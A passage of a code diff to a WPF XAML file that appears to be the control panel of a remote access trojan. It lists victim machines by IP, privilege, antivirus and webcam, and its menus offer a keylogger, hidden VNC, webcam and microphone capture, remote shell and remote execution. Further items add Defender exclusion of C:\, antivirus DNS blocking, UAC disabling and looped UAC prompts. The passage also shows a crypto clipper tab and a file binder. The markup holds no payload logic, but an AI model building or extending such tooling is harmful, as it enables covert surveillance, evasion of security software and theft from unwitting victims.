-                                            <MenuItem Header="UAC Elevation"       Click="RequestElevation_Click">      <MenuItem.Icon><Viewbox Width="13" Height="14"><Canvas Width="20" Height="22"><Canvas.Clip><PathGeometry Figures="M10,0 L20,3 L20,12 C20,18 10,22 10,22 C10,22 0,18 0,12 L0,3 Z"/></Canvas.Clip><Rectangle Canvas.Left="0" Canvas.Top="0" Width="10" Height="11" Fill="#1769C4"/><Rectangle Canvas.Left="10" Canvas.Top="0" Width="10" Height="11" Fill="#EDAA00"/><Rectangle Canvas.Left="0" Canvas.Top="11" Width="10" Height="11" Fill="#EDAA00"/><Rectangle Canvas.Left="10" Canvas.Top="11" Width="10" Height="11" Fill="#1769C4"/><Path Data="M10,0 L20,3 L20,12 C20,18 10,22 10,22 C10,22 0,18 0,12 L0,3 Z" Stroke="#0A0B18" StrokeThickness="2.5" Fill="Transparent"/><Line X1="10" Y1="0" X2="10" Y2="22" Stroke="#0A0B18" StrokeThickness="1.2"/><Line X1="0" Y1="11" X2="20" Y2="11" Stroke="#0A0B18" StrokeThickness="1.2"/></Canvas></Viewbox></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Loop UAC"            Click="RequestElevationLoop_Click">  <MenuItem.Icon><TextBlock Text="&#x1F501;" FontSize="11" FontFamily="Segoe UI Emoji"/></MenuItem.Icon></MenuItem>
-                                            <Separator/>
-                                            <MenuItem Header="Update Client"       Click="UpdateClient_Click">          <MenuItem.Icon><TextBlock Text="&#x1F504;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Disconnect"          Click="DisconnectClient_Click">      <MenuItem.Icon><TextBlock Text="&#x2716;" FontSize="12" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Uninstall Client"    Click="UninstallClient_Click">       <MenuItem.Icon><TextBlock Text="&#x1F5D1;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
-                                            <Separator/>
-                                            <MenuItem Header="Set Tag"             Click="SetTag_Click">                <MenuItem.Icon><TextBlock Text="&#x1F3F7;" FontSize="10" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="View Logs"           Click="ViewClientLogs_Click">        <MenuItem.Icon><TextBlock Text="&#x1F4DC;" FontSize="11" Foreground="#cba6f7"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Copy IP"             Click="CopyIP_Click">                <MenuItem.Icon><TextBlock Text="&#x1F4CB;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
-                                        </MenuItem>
-                                    </ContextMenu>
-                                </DataGrid.ContextMenu>
-                            </DataGrid>
+                                                </DataTemplate>
+                                            </DataGridTemplateColumn.CellTemplate>
+                                        </DataGridTemplateColumn>
+                                        <DataGridTextColumn Header="USER"      Binding="{Binding Username}"                           Width="110" />
+                                        <DataGridTextColumn Header="IP"        Binding="{Binding IP}"                                 Width="110" FontFamily="Consolas" FontSize="11"/>
+                                        <DataGridTextColumn Header="PRIV"      Binding="{Binding Privilege}"                          Width="52"  FontSize="11"/>
+                                        <DataGridTextColumn Header="COUNTRY"   Binding="{Binding CountryDisplay}"                     Width="115" />
+                                        <DataGridTextColumn Header="MACHINE"   Binding="{Binding MachineName}"                        Width="120" />
+                                        <DataGridTextColumn Header="OS"        Binding="{Binding OS}"                                 Width="115" />
+                                        <DataGridTextColumn Header="AV"        Binding="{Binding Antivirus}"                          Width="100" FontSize="11"/>
+                                        <DataGridTextColumn Header="PAYLOAD"   Binding="{Binding Payload}"                            Width="95"  FontSize="11"/>
+                                        <DataGridTextColumn Header="1ST SEEN"  Binding="{Binding FirstSeen, StringFormat=yyyy-MM-dd}" Width="84"  FontFamily="Consolas" FontSize="11"/>
+                                        <DataGridTextColumn Header="CPU"      Binding="{Binding CpuDisplay}"   Width="130" FontSize="11"/>
+                                        <DataGridTextColumn Header="GPU"      Binding="{Binding GpuDisplay}"   Width="130" FontSize="11"/>
+                                        <DataGridTextColumn Header="RAM"      Binding="{Binding RamDisplay}"   Width="105" FontFamily="Consolas" FontSize="11"/>
+                                        <DataGridTextColumn Header="CAM"       Binding="{Binding CameraIcon}"   Width="44"  FontSize="13"/>
+                                        <DataGridTextColumn Header="WINDOW"    Binding="{Binding ActiveWindow}" Width="140" />
+                                        <DataGridTemplateColumn Header="TAG" Width="100" SortMemberPath="Tag">
+                                            <DataGridTemplateColumn.CellTemplate>
+                                                <DataTemplate>
+                                                    <Border x:Name="TagBadge" CornerRadius="3" Padding="6,2"
+                                                            Background="#221700" BorderBrush="#5A3E08" BorderThickness="1"
+                                                            HorizontalAlignment="Left" Margin="2,0" Visibility="Collapsed">
+                                                        <StackPanel Orientation="Horizontal">
+                                                            <TextBlock Text="🏷" FontSize="9" Margin="0,0,4,0" VerticalAlignment="Center"/>
+                                                            <TextBlock Text="{Binding Tag}" Foreground="#D4A843"
+                                                                       FontSize="10" FontWeight="SemiBold" FontFamily="Segoe UI"
+                                                                       VerticalAlignment="Center"/>
+                                                        </StackPanel>
+                                                    </Border>
+                                                    <DataTemplate.Triggers>
+                                                        <DataTrigger Binding="{Binding HasTag}" Value="True">
+                                                            <Setter TargetName="TagBadge" Property="Visibility" Value="Visible"/>
+                                                        </DataTrigger>
+                                                    </DataTemplate.Triggers>
+                                                </DataTemplate>
+                                            </DataGridTemplateColumn.CellTemplate>
+                                        </DataGridTemplateColumn>
+                                        <DataGridTemplateColumn Header="PING"  Width="70" MinWidth="50" SortMemberPath="PingMs">
+                                            <DataGridTemplateColumn.CellTemplate>
+                                                <DataTemplate>
+                                                    <TextBlock Text="{Binding PingDisplay}" Foreground="{Binding PingBrush}"
+                                                               FontFamily="Consolas" FontSize="11" VerticalAlignment="Center" Margin="10,0" />
+                                                </DataTemplate>
+                                            </DataGridTemplateColumn.CellTemplate>
+                                        </DataGridTemplateColumn>
+                                    </DataGrid.Columns>
+                                    <DataGrid.ContextMenu>
+                                        <ContextMenu>
+                                            <!-- Administration -->
+                                            <MenuItem Header="Administration">
+                                                <MenuItem.Icon><TextBlock Text="&#x1F4BC;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon>
+                                                <MenuItem Header="Remote Shell"       Click="RemoteShell_Click">       <MenuItem.Icon><TextBlock Text="&gt;_" FontSize="10" FontFamily="Consolas" FontWeight="Bold" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="File Manager"       Click="FileManager_Click">       <MenuItem.Icon><TextBlock Text="&#x1F4C2;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Process Manager"    Click="ProcessManager_Click">    <MenuItem.Icon><TextBlock Text="&#x2699;" FontSize="11" Foreground="#4A85F5"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Startup Manager"    Click="StartupManager_Click">    <MenuItem.Icon><TextBlock Text="&#x1F680;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="TCP Connections"    Click="TcpManager_Click">        <MenuItem.Icon><TextBlock Text="&#x1F310;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
+                                                                <MenuItem x:Name="MenuItemSvcMgr" Header="Service Manager" Click="ServiceManager_Click"><MenuItem.Icon><Image x:Name="SvcMgrMenuIcon" Width="15" Height="15" RenderOptions.BitmapScalingMode="HighQuality"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Window Manager"     Click="WindowManager_Click">     <MenuItem.Icon><TextBlock Text="&#x1FA9F;" FontSize="11" FontFamily="Segoe UI Emoji"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Registry Editor"    Click="RegistryEditor_Click">    <MenuItem.Icon><TextBlock Text="&#x1F5C4;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Installed Programs" Click="InstalledApps_Click">     <MenuItem.Icon><TextBlock Text="&#x1F4E6;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Device Manager"     Click="DeviceManager_Click">     <MenuItem.Icon><TextBlock Text="&#x1F50C;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="SOCKS5 Proxy"       Click="Socks5_Click">            <MenuItem.Icon><TextBlock Text="&#x1F517;" FontSize="11" Foreground="#22C55E"/></MenuItem.Icon></MenuItem>
+                                                <Separator/>
+                                                <MenuItem Header="Remote Execute"     Click="RemoteFileExec_Click">    <MenuItem.Icon><TextBlock Text="&#x26A1;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
+                                            </MenuItem>
+                                            <!-- Monitoring -->
+                                            <MenuItem Header="Monitoring">
+                                                <MenuItem.Icon><TextBlock Text="&#x1F575;" FontSize="11" Foreground="#89dceb"/></MenuItem.Icon>
+                                                <MenuItem Header="Remote Desktop"      Click="RemoteDesktop_Click">       <MenuItem.Icon><TextBlock Text="&#x1F5A5;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Webcam"              Click="RemoteWebcam_Click">        <MenuItem.Icon><Grid Width="15" Height="15"><TextBlock Text="📷" FontSize="11" HorizontalAlignment="Center" VerticalAlignment="Center" Foreground="#89dceb"/><Image x:Name="CamMenuIcon" Width="15" Height="15" RenderOptions.BitmapScalingMode="HighQuality"/></Grid></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="HVNC"                Click="Hvnc_Click">                <MenuItem.Icon><TextBlock Text="&#x1F48E;" FontSize="11" Foreground="#A855F7"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Microphone"          Click="Microphone_Click">          <MenuItem.Icon><Grid Width="15" Height="15"><TextBlock Text="&#x1F399;" FontSize="11" HorizontalAlignment="Center" VerticalAlignment="Center" Foreground="#f38ba8"/><Image x:Name="MicMenuIcon" Width="15" Height="15" RenderOptions.BitmapScalingMode="HighQuality"/></Grid></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Keylogger"           Click="Keylogger_Click">           <MenuItem.Icon><TextBlock Text="&#x2328;" FontSize="11" Foreground="#cba6f7"/></MenuItem.Icon></MenuItem>
+                                                <Separator/>
+                                                <MenuItem Header="Performance Monitor" Click="PerformanceMonitor_Click">  <MenuItem.Icon><TextBlock Text="&#x1F4CA;" FontSize="11" Foreground="#22C55E"/></MenuItem.Icon></MenuItem>
+                                            </MenuItem>
+                                            <!-- Miscellaneous -->
+                                            <MenuItem Header="Miscellaneous">
+                                                <MenuItem.Icon><TextBlock Text="&#x1F527;" FontSize="11" Foreground="#606880"/></MenuItem.Icon>
+                                                <MenuItem Header="Exclude C:\ (Defender)" Click="QuickExcludeCDrive_Click"><MenuItem.Icon><TextBlock Text="&#x1F6E1;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Block AV DNS"        Click="QuickBlockAvDns_Click">     <MenuItem.Icon><TextBlock Text="&#x1F6AB;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Block WSReset"       Click="QuickBlockReset_Click">     <MenuItem.Icon><TextBlock Text="&#x1F512;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Disable UAC"         Click="QuickDisableUac_Click" ToolTip="EnableLUA=0 (admin required, takes effect after reboot)"><MenuItem.Icon><TextBlock Text="&#x26A0;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
+                                                <Separator/>
+                                                <MenuItem Header="Run BotKiller"       Click="BotKiller_Click" ToolTip="Kill unsigned random-name processes"><MenuItem.Icon><TextBlock Text="&#x2620;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
+                                            </MenuItem>
+                                            <!-- Fun -->
+                                            <MenuItem Header="Fun">
+                                                <MenuItem.Icon><TextBlock Text="&#x1F3AE;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon>
+                                                <MenuItem Header="Fun Panel"   Click="Fun_Click">       <MenuItem.Icon><TextBlock Text="&#x1F3AD;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
+                                                <Separator/>
+                                                <MenuItem Header="TikTok Bot"  Click="TikTok_Click">    <MenuItem.Icon><Image Source="/tiktok.png" Width="14" Height="14" RenderOptions.BitmapScalingMode="HighQuality"/></MenuItem.Icon></MenuItem>
+                                            </MenuItem>
+                                            <Separator />
+                                            <!-- Client Management -->
+                                            <MenuItem Header="Client Management">
+                                                <MenuItem.Icon><TextBlock Text="&#x1F464;" FontSize="11" Foreground="#606880"/></MenuItem.Icon>
+                                                <MenuItem Header="UAC Elevation"       Click="RequestElevation_Click">      <MenuItem.Icon><Viewbox Width="13" Height="14"><Canvas Width="20" Height="22"><Canvas.Clip><PathGeometry Figures="M10,0 L20,3 L20,12 C20,18 10,22 10,22 C10,22 0,18 0,12 L0,3 Z"/></Canvas.Clip><Rectangle Canvas.Left="0" Canvas.Top="0" Width="10" Height="11" Fill="#1769C4"/><Rectangle Canvas.Left="10" Canvas.Top="0" Width="10" Height="11" Fill="#EDAA00"/><Rectangle Canvas.Left="0" Canvas.Top="11" Width="10" Height="11" Fill="#EDAA00"/><Rectangle Canvas.Left="10" Canvas.Top="11" Width="10" Height="11" Fill="#1769C4"/><Path Data="M10,0 L20,3 L20,12 C20,18 10,22 10,22 C10,22 0,18 0,12 L0,3 Z" Stroke="#0A0B18" StrokeThickness="2.5" Fill="Transparent"/><Line X1="10" Y1="0" X2="10" Y2="22" Stroke="#0A0B18" StrokeThickness="1.2"/><Line X1="0" Y1="11" X2="20" Y2="11" Stroke="#0A0B18" StrokeThickness="1.2"/></Canvas></Viewbox></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Loop UAC"            Click="RequestElevationLoop_Click">  <MenuItem.Icon><TextBlock Text="&#x1F501;" FontSize="11" FontFamily="Segoe UI Emoji"/></MenuItem.Icon></MenuItem>
+                                                <Separator/>
+                                                <MenuItem Header="Update Client"       Click="UpdateClient_Click">          <MenuItem.Icon><TextBlock Text="&#x1F504;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Disconnect"          Click="DisconnectClient_Click">      <MenuItem.Icon><TextBlock Text="&#x2716;" FontSize="12" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Uninstall Client"    Click="UninstallClient_Click">       <MenuItem.Icon><TextBlock Text="&#x1F5D1;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
+                                                <Separator/>
+                                                <MenuItem Header="Set Tag"             Click="SetTag_Click">                <MenuItem.Icon><TextBlock Text="&#x1F3F7;" FontSize="10" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="View Logs"           Click="ViewClientLogs_Click">        <MenuItem.Icon><TextBlock Text="&#x1F4DC;" FontSize="11" Foreground="#cba6f7"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem Header="Copy IP"             Click="CopyIP_Click">                <MenuItem.Icon><TextBlock Text="&#x1F4CB;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
+                                            </MenuItem>
+                                        </ContextMenu>
+                                    </DataGrid.ContextMenu>
+                                </DataGrid>
 
-                            <!-- Empty state overlay for Online -->
-                            <Grid Grid.Row="1" IsHitTestVisible="False">
-                                <Grid.Style>
-                                    <Style TargetType="Grid">
-                                        <Setter Property="Visibility" Value="Collapsed"/>
-                                        <Style.Triggers>
-                                            <DataTrigger Binding="{Binding Items.Count, ElementName=GridClients}" Value="0">
-                                                <Setter Property="Visibility" Value="Visible"/>
-                                            </DataTrigger>
-                                        </Style.Triggers>
-                                    </Style>
-                                </Grid.Style>
-                                <StackPanel HorizontalAlignment="Center" VerticalAlignment="Center" Opacity="0.4">
-                                    <TextBlock Text="⊘" FontSize="40" Foreground="#606880" HorizontalAlignment="Center"/>
-                                    <TextBlock Text="No clients connected" Foreground="#606880" FontSize="13"
-                                               HorizontalAlignment="Center" Margin="0,8,0,0"/>
-                                </StackPanel>
+                                <!-- Empty state overlay for Online -->
+                                <Grid Grid.Column="0" IsHitTestVisible="False">
+                                    <Grid.Style>
+                                        <Style TargetType="Grid">
+                                            <Setter Property="Visibility" Value="Collapsed"/>
+                                            <Style.Triggers>
+                                                <DataTrigger Binding="{Binding Items.Count, ElementName=GridClients}" Value="0">
+                                                    <Setter Property="Visibility" Value="Visible"/>
+                                                </DataTrigger>
+                                            </Style.Triggers>
+                                        </Style>
+                                    </Grid.Style>
+                                    <StackPanel HorizontalAlignment="Center" VerticalAlignment="Center" Opacity="0.4">
+                                        <TextBlock Text="⊘" FontSize="40" Foreground="#606880" HorizontalAlignment="Center"/>
+                                        <TextBlock Text="No clients connected" Foreground="#606880" FontSize="13"
+                                                   HorizontalAlignment="Center" Margin="0,8,0,0"/>
+                                    </StackPanel>
+                                </Grid>
+
+                                <!-- Grid Settings Panel on the Right -->
+                                <Border Grid.Column="1" x:Name="GridSettingsPanel"
+                                        Width="260"
+                                        Background="#0F1020"
+                                        BorderBrush="#1E2038"
+                                        BorderThickness="1,0,0,0"
+                                        Visibility="Collapsed">
+                                    <Grid Margin="16">
+                                        <Grid.RowDefinitions>
+                                            <RowDefinition Height="Auto" /> <!-- Header -->
+                                            <RowDefinition Height="Auto" /> <!-- Filters Title -->
+                                            <RowDefinition Height="Auto" /> <!-- Filters -->
+                                            <RowDefinition Height="Auto" /> <!-- Columns Title -->
+                                            <RowDefinition Height="*" />    <!-- Columns scroll -->
+                                            <RowDefinition Height="Auto" /> <!-- Reset button -->
+                                        </Grid.RowDefinitions>
+
+                                        <!-- Header -->
+                                        <Grid Grid.Row="0" Margin="0,0,0,16">
+                                            <TextBlock Text="GRID SETTINGS" Foreground="#DDE0F0" FontSize="11" FontWeight="Bold" VerticalAlignment="Center"/>
+                                            <Button Content="✕" HorizontalAlignment="Right" Background="Transparent" BorderThickness="0" Foreground="#606880" Cursor="Hand" Click="CloseGridSettings_Click">
+                                                <Button.Template>
+                                                    <ControlTemplate TargetType="Button">
+                                                        <Border Background="Transparent" Padding="4">
+                                                            <TextBlock Text="{TemplateBinding Content}" FontSize="12" Foreground="{TemplateBinding Foreground}"/>
+                                                        </Border>
+                                                    </ControlTemplate>
+                                                </Button.Template>
+                                            </Button>
+                                        </Grid>
+
+                                        <!-- Filters -->
+                                        <TextBlock Grid.Row="1" Text="FILTERS" Style="{StaticResource SLabel}"/>
+                                        <StackPanel Grid.Row="2" Margin="0,0,0,16">
+                                            <CheckBox x:Name="ChkFilterWebcam" Content="📷 Webcam Only" Style="{StaticResource SettingsChk}" Checked="ChkFilterWebcam_Checked" Unchecked="ChkFilterWebcam_Unchecked" Margin="0,0,0,8"/>
+                                            <CheckBox x:Name="ChkFilterAdmin" Content="⚡ Admin Only" Style="{StaticResource SettingsChk}" Checked="ChkFilterAdmin_Checked" Unchecked="ChkFilterAdmin_Unchecked"/>
+                                        </StackPanel>
+
+                                        <!-- Column Visibility -->
+                                        <TextBlock Grid.Row="3" Text="COLUMN VISIBILITY" Style="{StaticResource SLabel}"/>
+                                        <ScrollViewer Grid.Row="4" VerticalScrollBarVisibility="Auto" Margin="0,0,0,16">
+                                            <StackPanel x:Name="StackColumnCheckboxes"/>
+                                        </ScrollViewer>
+
+                                        <!-- Reset Button -->
+                                        <Button Grid.Row="5" Content="Reset Filters to Default" Click="ResetGridSettings_Click" Height="32" Cursor="Hand" Foreground="#DDE0F0" BorderBrush="#252840">
+                                            <Button.Template>
+                                                <ControlTemplate TargetType="Button">
+                                                    <Border x:Name="bd" Background="#161A30" BorderBrush="#252840" BorderThickness="1.5" CornerRadius="4">
+                                                        <TextBlock Text="{TemplateBinding Content}" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="11" FontWeight="SemiBold" Foreground="{TemplateBinding Foreground}"/>
+                                                    </Border>
+                                                    <ControlTemplate.Triggers>
+                                                        <Trigger Property="IsMouseOver" Value="True">
+                                                            <Setter TargetName="bd" Property="Background" Value="#222B54"/>
+                                                            <Setter TargetName="bd" Property="BorderBrush" Value="#4A85F5"/>
+                                                        </Trigger>
+                                                    </ControlTemplate.Triggers>
+                                                </ControlTemplate>
+                                            </Button.Template>
+                                        </Button>
+                                    </Grid>
+                                </Border>
                             </Grid>
                         </Grid>
                     </Border>
@@ -1675,85 +1767,19 @@
                                     <DataGridTextColumn Header="EXECUTIONS" Binding="{Binding ExecutionCount}"                          Width="100" />
                                     <DataGridTextColumn Header="ADDED"      Binding="{Binding AddedAt, StringFormat=yyyy-MM-dd HH:mm}" Width="140" />
                                 </DataGrid.Columns>
+                                <DataGrid.ContextMenu>
+                                    <ContextMenu>
+                                        <MenuItem Header="Remove" Click="AutoTask_Remove_Click">
+                                            <MenuItem.Icon><TextBlock Text="&#x1F5D1;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon>
+                                        </MenuItem>
+                                        <Separator />
+                                        <MenuItem Header="Refresh" Click="AutoTask_Refresh_Click">
+                                            <MenuItem.Icon><TextBlock Text="&#x1F504;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon>
+                                        </MenuItem>
+                                    </ContextMenu>
+                                </DataGrid.ContextMenu>
                             </DataGrid>
                         </Grid>
-                    </Border>
-                </TabItem>
-
-                <!-- ── Settings ── -->
-                <TabItem>
-                    <TabItem.Header>
-                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                            <TextBlock Text="⚙" Foreground="#606880" FontSize="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
-                            <TextBlock Text="Settings"/>
-                        </StackPanel>
-                    </TabItem.Header>
-                    <Border Margin="8" CornerRadius="8"
-                            Background="#D0111222" BorderThickness="1">
-                        <Border.BorderBrush>
-                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
-                                <GradientStop Color="#283040FF" Offset="0"/>
-                                <GradientStop Color="#121E2038" Offset="1"/>
-                            </LinearGradientBrush>
-                        </Border.BorderBrush>
-                        <ScrollViewer VerticalScrollBarVisibility="Auto"
-                                      HorizontalScrollBarVisibility="Disabled">
-                        <StackPanel MaxWidth="520" HorizontalAlignment="Center" Margin="32,32,32,32">
-                            <TextBlock Text="SERVER LIMITS" Style="{StaticResource SLabel}" />
-                            <TextBlock Text="MAX CONNECTED CLIENTS" Style="{StaticResource SFieldLabel}" />
-                            <StackPanel Orientation="Horizontal" Margin="0,0,0,6">
-                                <TextBox x:Name="SettingsMaxClients" Style="{StaticResource STxt}" Text="1000" Width="120" />
-                                <Button Content="APPLY" Height="28" Margin="8,0,0,0" Padding="12,0"
-                                        Style="{StaticResource SGreenBtn}" FontSize="10"
-                                        Click="SettingsApplyMaxClients_Click" />
-                            </StackPanel>
-                            <TextBlock Text="Rejects new connections when this limit is reached." Foreground="#606880" FontSize="11" Margin="0,0,0,24" />
-
-                            <TextBlock Text="INTEGRATIONS" Style="{StaticResource SLabel}" />
-                            <StackPanel Orientation="Horizontal" Margin="0,0,0,8" VerticalAlignment="Center">
-                                <CheckBox x:Name="SettingsDiscordRPC" Content="Discord Rich Presence" Style="{StaticResource SChk}" VerticalAlignment="Center" />
-                                <Button Content="APPLY" Height="22" Margin="12,0,0,0" Padding="10,0"
-                                        Style="{StaticResource SGreenBtn}" FontSize="10"
-                                        Click="SettingsApplyDiscordRPC_Click" />
-                            </StackPanel>
-                            <CheckBox x:Name="SettingsNotifySound" Content="Connection notifications (sound + alert)" Style="{StaticResource SChk}" Margin="0,0,0,8"
-                                      Checked="SettingsNotifySound_Changed" Unchecked="SettingsNotifySound_Changed" />
-                            <CheckBox x:Name="SettingsLogsBadge" Content="Show unread badge on Logs tab" Style="{StaticResource SChk}" Margin="0,0,0,24"
-                                      IsChecked="True"
-                                      Checked="SettingsLogsBadge_Changed" Unchecked="SettingsLogsBadge_Changed" />
-
-                            <TextBlock Text="DIAGNOSTICS" Style="{StaticResource SLabel}" />
-                            <CheckBox x:Name="SettingsDevLogs" Content="Enable diagnostic logging (crashes, disconnections, stream events)"
-                                      Style="{StaticResource SChk}" IsChecked="True" Margin="0,0,0,4"
-                                      Checked="SettingsDevLogs_Changed" Unchecked="SettingsDevLogs_Changed" />
-                            <StackPanel Orientation="Horizontal" Margin="0,0,0,4">
-                                <TextBlock x:Name="TxtDevLogsPath" Text="" Foreground="#404878"
-                                           FontSize="10" FontFamily="Consolas" VerticalAlignment="Center"/>
-                                <Button Content="Open folder" Margin="10,0,0,0" Height="22" Padding="8,0"
-                                        Style="{StaticResource SBtn}" Click="OpenDiagLogsFolder_Click"/>
-                            </StackPanel>
-                            <TextBlock Text="Logs rotate: 5 files × 5 MB — no screenshots or credentials are ever written."
-                                       Foreground="#404060" FontSize="10" Margin="0,0,0,20"/>
-
-                            <TextBlock Text="APPEARANCE" Style="{StaticResource SLabel}" />
-                            <CheckBox x:Name="SettingsHideLogo" Content="Hide background logo (dark mode)" Style="{StaticResource SChk}" Margin="0,0,0,8"
-                                      Checked="SettingsHideLogo_Changed" Unchecked="SettingsHideLogo_Changed" />
-                            <CheckBox x:Name="SettingsBlockCapture" Content="Block screen recording (window hidden from OBS / screenshots / RDP)" Style="{StaticResource SChk}" Margin="0,0,0,4"
-                                      Checked="SettingsBlockCapture_Changed" Unchecked="SettingsBlockCapture_Changed" />
-                            <TextBlock Text="Uses SetWindowDisplayAffinity — window appears black in any capture tool." Foreground="#404060" FontSize="10" Margin="0,0,0,24"/>
-
-                            <TextBlock Text="PORT CHECKER" Style="{StaticResource SLabel}" />
-                            <StackPanel Orientation="Horizontal" Margin="0,0,0,8">
-                                <TextBox x:Name="SettingsCheckIP"   Style="{StaticResource STxt}" Width="160" Text="127.0.0.1" />
-                                <TextBlock Text=":" Foreground="#606880" FontSize="16" VerticalAlignment="Center" Margin="8,0" />
-                                <TextBox x:Name="SettingsCheckPort" Style="{StaticResource STxt}" Width="64" Text="7777" />
-                                <Button Content="CHECK" Height="32" Margin="10,0,0,0" Style="{StaticResource SGreenBtn}" Click="CheckPort_Click" />
-                                <Button Content="GET IP" Height="32" Margin="8,0,0,0"  Style="{StaticResource SBtn}"      Click="GetMyIP_Click" />
-                            </StackPanel>
-                            <TextBlock x:Name="TxtPortResult" Text="" Foreground="#606880" FontSize="12" Margin="0,4,0,24" />
-
-                        </StackPanel>
-                        </ScrollViewer>
                     </Border>
                 </TabItem>
 
@@ -1790,51 +1816,6 @@
                             <UniformGrid x:Name="ScreenPanel" Columns="4" Margin="72,36,72,36" VerticalAlignment="Top"/>
                         </ScrollViewer>
                     </DockPanel>
-                </TabItem>
-
-                <!-- ── Logs ── -->
-                <TabItem x:Name="LogsTabItem">
-                    <TabItem.Header>
-                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                            <TextBlock Text="≋" Foreground="#606880" FontSize="13" Margin="0,0,5,0" VerticalAlignment="Center"/>
-                            <TextBlock Text="Logs"/>
-                            <!-- Canvas size=0 so badge floats above without affecting tab width -->
-                            <Canvas Width="0" Height="0" VerticalAlignment="Center">
-                                <Border x:Name="LogBadge" Background="#EF4444" CornerRadius="7"
-                                        Padding="4,1" Canvas.Left="4" Canvas.Top="-8"
-                                        Visibility="Collapsed">
-                                    <TextBlock x:Name="LogBadgeTxt" Text="0" Foreground="White"
-                                               FontSize="9" FontWeight="Bold" FontFamily="Segoe UI"/>
-                                </Border>
-                            </Canvas>
-                        </StackPanel>
-                    </TabItem.Header>
-                    <Border Margin="8" Padding="4" CornerRadius="8"
-                            Background="#D0111222" BorderThickness="1">
-                        <Border.BorderBrush>
-                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
-                                <GradientStop Color="#283040FF" Offset="0"/>
-                                <GradientStop Color="#121E2038" Offset="1"/>
-                            </LinearGradientBrush>
-                        </Border.BorderBrush>
-                        <!-- RichTextBox: supports coloured runs AND text selection/copy -->
-                        <RichTextBox x:Name="TxtLogs"
-                                     Background="Transparent" BorderThickness="0"
-                                     FontFamily="Consolas" FontSize="11"
-                                     IsReadOnly="True" IsDocumentEnabled="True"
-                                     VerticalScrollBarVisibility="Auto"
-                                     HorizontalScrollBarVisibility="Disabled"
-                                     Padding="8,6"
-                                     SelectionBrush="#404878" CaretBrush="Transparent">
-                            <RichTextBox.Resources>
-                                <!-- Remove the default 4px paragraph spacing -->
-                                <Style TargetType="Paragraph">
-                                    <Setter Property="Margin" Value="0"/>
-                                    <Setter Property="LineHeight" Value="16"/>
-                                </Style>
-                            </RichTextBox.Resources>
-                        </RichTextBox>
-                    </Border>
                 </TabItem>
 
                 <!-- ── Crypto Clipper ── -->
@@ -2110,8 +2091,332 @@
                                     </DataGridTemplateColumn.CellTemplate>
                                 </DataGridTemplateColumn>
                             </DataGrid.Columns>
+                            <DataGrid.ContextMenu>
+                                <ContextMenu>
+                                    <MenuItem Header="Remove Entry" Click="BtnBinderRemove_Click">
+                                        <MenuItem.Icon><TextBlock Text="&#x1F5D1;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon>
+                                    </MenuItem>
+                                    <MenuItem Header="Clear All" Click="BtnBinderClearAll_Click">
+                                        <MenuItem.Icon><TextBlock Text="&#x1F5D1;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon>
+                                    </MenuItem>
+                                    <Separator />
+                                    <MenuItem Header="Move Up" Click="BtnBinderUp_Click">
+                                        <MenuItem.Icon><TextBlock Text="&#x25B2;" FontSize="10" Foreground="#89b4fa"/></MenuItem.Icon>
+                                    </MenuItem>
+                                    <MenuItem Header="Move Down" Click="BtnBinderDown_Click">
